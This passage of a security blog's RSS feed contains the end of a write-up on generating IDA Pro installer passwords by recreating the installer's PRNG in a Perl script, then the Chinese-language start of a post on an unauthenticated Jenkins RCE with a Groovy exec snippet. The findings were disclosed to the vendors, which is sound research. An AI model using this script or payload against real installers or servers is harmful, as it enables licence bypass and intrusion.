                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking team‚Äôs leaked password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;

&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;

&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;

&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âó®! Â§ßÂÆ∂‰ªäÂ§©ÈÅéÂæóÂ•ΩÂóé?&lt;/p&gt;

&lt;p&gt;ÈÄôÁØáÊñáÁ´†ÊòØ Hacking Jenkins Á≥ªÂàóÁöÑ‰∏ãÈõÜ! Áµ¶ÈÇ£‰∫õÈÇÑÊ≤íÁúãÈÅé‰∏äÁØáÊñáÁ´†ÁöÑÂêåÂ≠∏ÔºåÂèØ‰ª•Ë®™Âïè‰∏ãÈù¢ÈèàÁµêÔºåË£úÂÖÖ‰∏Ä‰∫õÂü∫Êú¨Áü•Ë≠òÂèä‰∫ÜËß£‰πãÂâçÂ¶Ç‰ΩïÂæû Jenkins ‰∏≠ÁöÑÂãïÊÖãË∑ØÁî±Ê©üÂà∂Âà∞‰∏≤Âá∫ÂêÑÁ®Æ‰∏çÂêåÁöÑÊîªÊìäÈèà!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â¶Ç‰∏äÁØáÊñáÁ´†ÊâÄË™™ÔºåÁÇ∫‰∫ÜÊúÄÂ§ßÁ®ãÂ∫¶ÁôºÊèÆÊºèÊ¥ûÁöÑÊïàÊûúÔºåÊÉ≥Â∞ãÊâæ‰∏ÄÂÄã‰ª£Á¢ºÂü∑Ë°åÁöÑÊºèÊ¥ûÂèØ‰ª•Ëàá ACL ÁπûÈÅéÊºèÊ¥ûÊê≠ÈÖçÔºåÊàêÁÇ∫‰∏ÄÂÄã‰∏çÁî®Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å! ‰∏çÈÅéÂú®ÊúÄÂàùÁöÑÂòóË©¶‰∏≠Â§±Êïó‰∫ÜÔºåÁî±ÊñºÂãïÊÖãË∑ØÁî±Ê©üÂà∂ÁöÑÁâπÊÄßÔºåJenkins Âú®ÈÅáÂà∞‰∏Ä‰∫õÂç±Èö™Êìç‰ΩúÊôÇ(Â¶Ç &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)ÈÉΩÊúÉÂÜçÊ¨°ÁöÑÊ™¢Êü•Ê¨äÈôê! Â∞éËá¥Â∞±ÁÆóÂèØ‰ª•ÁπûÈÅéÊúÄÂâçÈù¢ÁöÑ ACL Â±§‰æùÁÑ∂ÁÑ°Ê≥ïÂÅöÂ§™Â§ö‰∫ãÊÉÖ!&lt;/p&gt;

&lt;p&gt;Áõ¥Âà∞ Jenkins Âú® 2018-12-05 Áôº‰ΩàÁöÑ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; ‰øÆÂæ©‰∫ÜÂâçËø∞ÊàëÊâÄÂõûÂ†±ÁöÑÂãïÊÖãË∑ØÁî±ÊºèÊ¥û! ÁÇ∫‰∫ÜÈñãÂßãÊí∞ÂØ´ÈÄô‰ªΩÊäÄË°ìÊñáÁ´†(Hacking Jenkins Á≥ªÂàóÊñá)ÔºåÊàëÈáçÊñ∞Ë§áÁøí‰∫Ü‰∏ÄÊ¨°Áï∂ÂàùÈÄ≤Ë°å‰ª£Á¢ºÂØ©Êü•ÁöÑÁ≠ÜË®òÔºåÁï∂‰∏≠Â∞çÂÖ∂‰∏≠‰∏ÄÂÄãË∑≥Êùø(gadget)ÊÉ≥Âà∞‰∫Ü‰∏ÄÂÄã‰∏ç‰∏ÄÊ®£ÁöÑÂà©Áî®ÊñπÂºèÔºåÂõ†ËÄåÊúâ‰∫ÜÈÄôÁØáÊïÖ‰∫ã! ÈÄô‰πüÊòØËøëÊúüÊàëÊâÄÂØ´ÈÅéË¶∫ÂæóÊØîËºÉÊúâË∂£ÁöÑÊºèÊ¥û‰πã‰∏ÄÔºåÈùûÂ∏∏Êé®Ëñ¶ÂèØ‰ª•‰ªîÁ¥∞Èñ±ËÆÄ‰∏Ä‰∏ã!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÂàÜÊûê&quot;&gt;ÊºèÊ¥ûÂàÜÊûê&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Ë¶ÅËß£ÈáãÈÄôÊ¨°ÁöÑÊºèÊ¥û &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; ÂøÖÈ†àË¶ÅÂæû Pipeline ÈñãÂßãË¨õËµ∑! Â§ßÈÉ®ÂàÜÈñãÁôºËÄÖÊúÉÈÅ∏Êìá Jenkins ‰ΩúÁÇ∫ CI/CD ‰º∫ÊúçÂô®ÁöÑÂÖ∂‰∏≠‰∏ÄÂÄãÂéüÂõ†ÊòØÂõ†ÁÇ∫ Jenkins Êèê‰æõ‰∫Ü‰∏ÄÂÄãÂæàÂº∑Â§ßÁöÑ Pipeline ÂäüËÉΩÔºå‰ΩøÈñãÁôºËÄÖÂèØ‰ª•Êñπ‰æøÁöÑÂéªÊí∞ÂØ´‰∏Ä‰∫õ Build Script ‰ª•ÂÆåÊàêËá™ÂãïÂåñÁöÑÁ∑®Ë≠Ø„ÄÅÊ∏¨Ë©¶ÂèäÁôº‰Ωà! ‰Ω†ÂèØ‰ª•ÊÉ≥ÂÉè Pipeline Â∞±ÊòØ‰∏ÄÂÄãÂ∞èÂ∞èÁöÑÂæÆË™ûË®ÄÂèØ‰ª•ÂéªÂ∞ç Jenkins ÈÄ≤Ë°åÊìç‰Ωú(ËÄåÂØ¶Èöõ‰∏ä Pipeline ÊòØÂü∫Êñº Groovy ÁöÑ‰∏ÄÂÄã DSL)&lt;/p&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÊ™¢Êü•‰ΩøÁî®ËÄÖÊâÄÊí∞ÂØ´ÁöÑ Pipeline Script ÊúâÊ≤íÊúâË™ûÊ≥ï‰∏äÁöÑÈåØË™§(Syntax Error)ÔºåJenkins Êèê‰æõ‰∫Ü‰∏ÄÂÄã‰ªãÈù¢Áµ¶‰ΩøÁî®ËÄÖÊ™¢Êü•Ëá™Â∑±ÁöÑ Pipeline! ÈÄôË£°‰Ω†ÂèØ‰ª•ÊÉ≥ÂÉè‰∏Ä‰∏ãÔºåÂ¶ÇÊûú‰Ω†ÊòØÁ®ãÂºèË®≠Ë®àÂ∏´Ôºå‰Ω†Ë¶ÅÂ¶Ç‰ΩïÂéªÂÆåÊàêÈÄôÂÄãÂäüËÉΩÂë¢? ‰Ω†ÂèØ‰ª•Ëá™Â∑±ÂØ¶Áèæ‰∏ÄÂÄãË™ûÊ≥ïÊ®π(AST, Abstract Syntax Tree)Ëß£ÊûêÂô®ÂéªÂÆåÊàêÈÄô‰ª∂‰∫ãÔºå‰∏çÈÅéÈÄôÂ§™Á¥Ø‰∫ÜÔºåÊúÄÁ∞°ÂñÆÁöÑÊñπÂºèÁï∂ÁÑ∂ÊòØÂ•óÁî®ÁèæÊàêÁöÑÊù±Ë•ø!&lt;/p&gt;

&lt;p&gt;ÂâçÈù¢ÊèêÂà∞ÔºåPipeline ÊòØÂü∫Êñº Groovy ÊâÄÂØ¶ÁèæÁöÑ‰∏ÄÂÄã DSLÔºåÊâÄ‰ª• Pipeline ÂøÖÂÆö‰πüÈÅµÂÆàËëó Groovy ÁöÑË™ûÊ≥ï! ÊâÄ‰ª•ÊúÄÁ∞°ÂñÆÁöÑÊñπÂºèÊòØÔºåÂè™Ë¶Å Groovy ÂèØ‰ª•ÊàêÂäüËß£Êûê(parse)ÔºåÈÇ£Â∞±‰ª£Ë°®ÈÄô‰ªΩ Pipeline ÁöÑË™ûÊ≥ï‰∏ÄÂÆöÊòØÂ∞çÁöÑ! Jenkins ÂØ¶‰ΩúÊ™¢Êü•ÁöÑÁ®ãÂºèÁ¢ºÁ¥ÑÊòØ‰∏ãÈù¢ÈÄôÊ®£Â≠ê:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôË£°‰ΩøÁî®‰∫Ü &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(‚Ä¶)&lt;/a&gt; ÂéªÂÆåÊàê Groovy Ë™ûÊ≥ïÁöÑËß£Êûê! ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÁî±ÊñºÈÄôÂè™ÊòØ‰∏ÄÂÄã AST ÁöÑËß£ÊûêÔºåÂú®Ê≤íÊúâÂü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; ÁöÑÊñπÊ≥ïÂâçÔºå‰ªª‰ΩïÂç±Èö™ÁöÑÊìç‰ΩúÊòØ‰∏çÊúÉË¢´Âü∑Ë°åÁöÑÔºå‰æãÂ¶ÇÂòóË©¶ÂéªËß£ÊûêÈÄôÊÆµ Groovy ‰ª£Á¢ºÊúÉÁôºÁèæÂÖ∂ÂØ¶‰ªÄÈ∫º‰∫ãÈÉΩÊ≤íÁôºÁîü :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂæûÁ®ãÂºèÈñãÁôºËÄÖÁöÑËßíÂ∫¶‰æÜÁúãÔºåPipeline ÂèØ‰ª•Êìç‰Ωú Jenkins ÈÇ£‰∏ÄÂÆöÂæàÂç±Èö™ÔºåÂõ†Ê≠§Ë¶ÅÁî®Âö¥Ê†ºÁöÑÊ¨äÈôê‰øùË≠∑‰Ωè! ‰ΩÜÈÄôÂè™ÊòØ‰∏ÄÊÆµÁ∞°ÂñÆÁöÑË™ûÊ≥ïÈåØË™§Ê™¢Êü•ÔºåËÄå‰∏îÂëºÂè´Âà∞ÁöÑÂú∞ÊñπÂæàÂ§öÔºåÈôêÂà∂Â§™Âö¥Ê†ºÁöÑÊ¨äÈôêÂè™ÊúÉËÆìËá™Â∑±Á∂ÅÊâãÁ∂ÅËÖ≥ÁöÑ!&lt;/p&gt;

&lt;p&gt;‰∏äÈù¢ÁöÑËßÄÈªûËÅΩËµ∑‰æÜÂæàÂêàÁêÜÔºåÂ∞±Âè™ÊòØ‰∏ÄÂÄã AST ÁöÑËß£ÊûêËÄå‰∏îÊ≤íÊúâ‰ªª‰Ωï &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; ÊñπÊ≥ïÊáâË©≤ÂæàÂÆâÂÖ®Ôºå‰ΩÜÊÅ∞Â∑ßÈÄôË£°Â∞±ÊàêÁÇ∫‰∫ÜÊàëÂÄëÁ¨¨‰∏ÄÂÄãÂÖ•Âè£Èªû! ÂÖ∂ÂØ¶Á¨¨‰∏ÄÊ¨°ÁúãÂà∞ÈÄôÊÆµ‰ª£Á¢ºÊôÇÔºå‰πüÊÉ≥‰∏çÂá∫‰ªÄÈ∫ºÂà©Áî®ÊñπÊ≥ïÂ∞±ÂÖàË∑≥ÈÅé‰∫ÜÔºåÁõ¥Âà∞Ë¶ÅÈñãÂßãÊí∞ÂØ´ÊäÄË°ìÊñáÁ´†ÈáçÊñ∞Ê∫´Áøí‰∫Ü‰∏ÄÊ¨°ÔºåÊàëÊÉ≥Ëµ∑‰∫ÜË™™‰∏çÂÆö Meta-Programming ÊúÉÊúâÊêûÈ†≠!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;‰ªÄÈ∫ºÊòØ-meta-programming&quot;&gt;‰ªÄÈ∫ºÊòØ Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;È¶ñÂÖàÊàëÂÄë‰æÜËß£Èáã‰∏Ä‰∏ã‰ªÄÈ∫ºÊòØ Meta-Programming!&lt;/p&gt;

&lt;p&gt;Meta-Programming ÊòØ‰∏ÄÁ®ÆÁ®ãÂºèË®≠Ë®àÁöÑÊÄùÁ∂≠! Meta-Programming ÁöÑÁ≤æÈ´ìÂú®ÊñºÊèê‰æõ‰∫Ü‰∏ÄÂÄãÊäΩË±°Â±§Ê¨°Áµ¶ÈñãÁôºËÄÖÁî®Âè¶Â§ñ‰∏ÄÁ®ÆÊÄùÁ∂≠ÂéªÊí∞ÂØ´Êõ¥È´òÈùàÊ¥ªÂ∫¶ÂèäÊõ¥È´òÈñãÁôºÊïàÁéáÁöÑ‰ª£Á¢º„ÄÇÂÖ∂ÂØ¶ Meta-Programming ‰∏¶Ê≤íÊúâ‰∏ÄÂÄãÂæàÂö¥Ë¨πÁöÑÂÆöÁæ©Ôºå‰æãÂ¶Ç‰ΩøÁî®Á®ãÂºèË™ûË®ÄÁ∑®Ë≠ØÊâÄÁïô‰∏ãÁöÑ Metadata ÂéªÂãïÊÖãÁöÑÁî¢ÁîüÁ®ãÂºèÁ¢ºÔºåÊàñÊòØÊääÁ®ãÂºèËá™Ë∫´Áï∂ÊàêË≥áÊñôÔºåÈÄèÈÅéÁ∑®Ë≠ØÂô®(compiler)ÊàñÊòØÁõ¥Ë≠ØÂô®(interpreter)ÂéªÊí∞ÂØ´‰ª£Á¢ºÈÉΩÂèØ‰ª•Ë¢´Ë™™ÊòØ‰∏ÄÁ®Æ Meta-Programming! ËÄåÂÖ∂‰∏≠ÁöÑÂì≤Â≠∏ÂÖ∂ÂØ¶ÈùûÂ∏∏Âª£Ê≥õÁîöËá≥Â∑≤Á∂ìÂèØ‰ª•Ë¢´Áï∂ÊàêÁ®ãÂºèË™ûË®ÄÁöÑ‰∏ÄÂÄãÁ´†ÁØÄ‰æÜÁç®Á´ãÊé¢Ë®é!&lt;/p&gt;

&lt;p&gt;Â§ßÈÉ®ÂàÜÁöÑÊñáÁ´†ÊàñÊòØÊõ∏Á±çÂú®Ëß£Èáã Meta-Programming ÁöÑÊôÇÂÄôÈÄöÂ∏∏ÊúÉÈÄôÊ®£Ëß£Èáã:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Áî®Á®ãÂºèÁ¢º(code)Áî¢ÁîüÁ®ãÂºèÁ¢º(code)&lt;/p&gt;
&lt;/blockquote&gt;

